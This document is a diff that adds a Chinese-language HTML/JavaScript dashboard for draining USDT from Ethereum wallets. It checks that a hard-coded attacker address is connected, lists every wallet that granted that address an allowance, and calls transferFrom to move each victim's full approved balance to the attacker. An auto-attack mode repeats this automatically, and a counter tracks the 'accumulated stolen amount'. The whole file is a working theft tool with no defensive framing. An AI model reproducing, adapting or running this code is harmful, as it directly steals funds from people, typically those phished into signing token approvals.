@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8">
+  <title>🌟 EOA 控制台 v1.6（授權時間 + 攻擊狀態）</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body { font-family: 'Arial'; padding: 20px; background: #fff; }
+    input { padding: 8px; margin-right: 8px; width: 350px; }
+    button { padding: 8px 16px; }
+    .ok { color: green; }
+    .bad { color: red; }
+    table { border-collapse: collapse; width: 100%; margin-top: 10px; }
+    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
+    th { background-color: #f4f4f4; }
+  </style>
+</head>
+<body>
+  <h2>🌟 EOA 控制台 v1.6（授權時間 + 攻擊狀態）</h2>
+  <p><b>目前登入帳號：</b><span id="account">未連線...</span></p>
+  <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
+  <p><b>攻擊者 USDT 餘額：</b><span id="mybalance">查詢中...</span></p>
+  <p><b>最後刷新時間：</b><span id="refresh">未刷新</span></p>
+  <p><b>累積盜取金額：</b><span id="total">0 USDT</span></p>
+  <p><b>自動攻擊狀態：</b><span id="mode" class="bad">已停用</span></p>
+  <button onclick="toggleAuto()">🔄 切換自動攻擊</button>
+
+  <br><br>
+  <input id="victim" placeholder="受害者地址" />
+  <button onclick="steal()">🧨 盜取 USDT</button>
+  <p id="balance"></p>
+  <p id="status">等待操作中...</p>
+
+  <h3>📌 所有授權地址：</h3>
+  <table>
+    <thead>
+      <tr><th>📍 地址</th><th>⏰ 授權時間</th><th>🔥 攻擊狀態</th></tr>
+    </thead>
+    <tbody id="approvals"></tbody>
+  </table>
+
+  <script>
+    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
+    const ABI = [
+      "event Approval(address indexed owner, address indexed spender, uint256 value)",
+      "function transferFrom(address from, address to, uint256 value) returns (bool)",
+      "function balanceOf(address) view returns (uint256)",
+      "function allowance(address owner, address spender) view returns (uint256)"
+    ];
+    let provider, signer, sender;
+    let totalStolen = ethers.BigNumber.from("0");
+    let autoEnabled = false;
+    const attackedSet = new Set();
+    const approvalMap = new Map();
+
+    async function connect() {
+      if (!window.ethereum) return alert("請安裝 MetaMask");
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      sender = await signer.getAddress();
+      document.getElementById("account").innerText = sender;
+      document.getElementById("auth").innerText =
+        sender.toLowerCase() === attacker.toLowerCase()
+          ? "攻擊者身份驗證成功"
+          : "非攻擊者地址";
+      document.getElementById("auth").className =
+        sender.toLowerCase() === attacker.toLowerCase() ? "ok" : "bad";
+      await updateMyBalance();
+      fetchApprovals();
+      setInterval(() => {
+        fetchApprovals();
+        updateMyBalance();
+      }, 10000);
+    }
+
+    async function updateMyBalance() {
+      try {
+        const contract = new ethers.Contract(USDT, ABI, provider);
+        const balance = await contract.balanceOf(sender);
+        document.getElementById("mybalance").innerText =
+          ethers.utils.formatUnits(balance, 6) + " USDT";
+      } catch {
+        document.getElementById("mybalance").innerText = "查詢失敗";
+      }
+    }
+
+    function toggleAuto() {
+      autoEnabled = !autoEnabled;
+      const label = document.getElementById("mode");
+      label.innerText = autoEnabled ? "已啟用" : "已停用";
+      label.className = autoEnabled ? "ok" : "bad";
+    }
+
+    async function fetchApprovals() {
+      const contract = new ethers.Contract(USDT, ABI, provider);
+      const events = await contract.queryFilter(contract.filters.Approval(null, attacker), 19000000);
+      const tbody = document.getElementById("approvals");
+      tbody.innerHTML = "";
+      for (const ev of events.reverse()) {
+        const owner = ev.args.owner;
+        if (!approvalMap.has(owner)) {
+          approvalMap.set(owner, ev.blockNumber);
+        }
+        const time = new Date().toLocaleString();
+        const tr = document.createElement("tr");
+        tr.innerHTML = `
+          <td>${owner}</td>
+          <td>${time}</td>
+          <td class="status" id="status-${owner}">尚未攻擊</td>
+        `;
+        tbody.appendChild(tr);
+        if (autoEnabled) await autoSteal(owner);
+      }
+      document.getElementById("refresh").innerText = new Date().toLocaleTimeString();
+    }
+
+    async function steal() {
+      const victim = document.getElementById("victim").value;
+      await autoSteal(victim);
+    }
+
+    async function autoSteal(victim) {
+      if (attackedSet.has(victim)) return;
+      const contract = new ethers.Contract(USDT, ABI, signer);
+      try {
+        const balance = await contract.balanceOf(victim);
+        const allowance = await contract.allowance(victim, attacker);
+        const amount = balance.lt(allowance) ? balance : allowance;
+        if (amount.isZero()) return;
+        const tx = await contract.transferFrom(victim, attacker, amount);
+        totalStolen = totalStolen.add(amount);
+        const formatted = ethers.utils.formatUnits(totalStolen, 6);
+        document.getElementById("total").innerText = formatted + " USDT";
+        document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
+        document.getElementById(`status-${victim}`).innerText = "✅ 已攻擊";
+        document.getElementById(`status-${victim}`).className = "ok";
+        attackedSet.add(victim);
+      } catch (e) {
+        document.getElementById("status").innerText = "❌ 失敗: " + e.message;
+      }
+    }
+
+    document.getElementById("victim").addEventListener("input", async (e) => {
+      const val = e.target.value;
+      if (ethers.utils.isAddress(val)) {
+        try {
+          const contract = new ethers.Contract(USDT, ABI, provider);
+          const balance = await contract.balanceOf(val);
+          const allowance = await contract.allowance(val, attacker);
+          const readableBalance = ethers.utils.formatUnits(balance, 6);
+          const readableAllowance = ethers.utils.formatUnits(allowance, 6);
+          document.getElementById("balance").innerText =
+            "💰 USDT 餘額: " + readableBalance + " USDT\n📜 授權額度: " + readableAllowance + " USDT";
+        } catch {
+          document.getElementById("balance").innerText = "查詢失敗";
+        }
+      } else {
+        document.getElementById("balance").innerText = "";
+      }
+    });
+
+    connect();
+  </script>
+</body>
+</html>
